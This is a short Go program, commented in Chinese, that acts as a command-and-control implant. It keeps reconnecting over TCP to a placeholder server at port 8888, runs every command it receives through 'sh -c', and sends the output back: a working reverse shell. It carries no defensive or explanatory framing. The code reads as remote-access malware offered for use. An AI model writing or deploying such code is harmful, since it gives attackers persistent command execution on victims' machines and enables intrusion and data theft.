package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

func connectToC2Server() {
	for {
		conn, err := net.Dial("tcp", "C2_SERVER_IP:8888") // 替换C2_SERVER_IP为实际的C2服务器IP
		if err != nil {
			fmt.Println("无法连接到C2服务器：", err)
			fmt.Println("等待 5 秒后尝试重新连接...")
			time.Sleep(5 * time.Second) // 等待5秒后重新连接
			continue
		}

		fmt.Println("成功连接到C2服务器")

		handleConnection(conn)
		fmt.Println("与C2服务器的连接已断开")
		conn.Close()

		// 连接中断后等待 5 秒后尝试重新连接
		fmt.Println("等待 5 秒后尝试重新连接...")
		time.Sleep(5 * time.Second)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	fmt.Printf("与 %s 建立连接\n", conn.RemoteAddr())

	reader := bufio.NewReader(conn)
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("连接断开")
			break
		}

		command := strings.TrimSpace(message)
		if command == "exit" {
			break
		}

		output, err := executeCommand(command, 10*time.Second) // 设置命令执行的超时时间为10秒
		if err != nil {
			output = []byte(fmt.Sprintf("执行命令时出现错误: %s\n", err))
		}

		conn.Write(output)
	}
}

func executeCommand(command string, timeout time.Duration) ([]byte, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}

	return output, nil
}

func main() {
	for {
		connectToC2Server()
	}
}
